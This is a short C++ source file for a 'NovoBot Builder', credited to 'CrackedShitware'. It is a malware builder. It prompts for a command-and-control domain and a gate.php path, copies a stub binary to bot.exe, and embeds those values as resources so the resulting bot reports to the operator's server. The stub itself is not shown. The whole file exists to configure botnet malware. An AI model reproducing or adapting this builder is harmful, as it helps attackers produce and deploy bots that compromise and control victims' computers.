#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <string>

using namespace std;
int main()
{
	
	string szDomain;
	string szPath;

	
	cout << "NovoBot Builder - Created By CrackedShitware" << endl; 
	cout << "Please enter your domain [example : domain.com] :";
	getline(cin, szDomain);
	cout << endl;
	cout << "Please enter the path to gate.php [example : /bot/gate.php]:";
	getline(cin, szPath);
	cout << endl;

	DeleteFile("bot.exe");

	//Copy file -- Should store it in a resource but who cares
	CopyFile("stub.bin", "bot.exe", FALSE);

	HANDLE hUpdate;
	hUpdate = BeginUpdateResource("bot.exe", FALSE);
	UpdateResource(hUpdate, "SI", "1", 1, (LPCSTR*)szDomain.c_str(), szDomain.length());
	UpdateResource(hUpdate, "SP", "1", 1, (LPCSTR*)szPath.c_str(), szPath.length());
	EndUpdateResource(hUpdate, FALSE);
	//*** ALL DONE ***//
	cout << "Done!";
	getchar();

	return 0;
}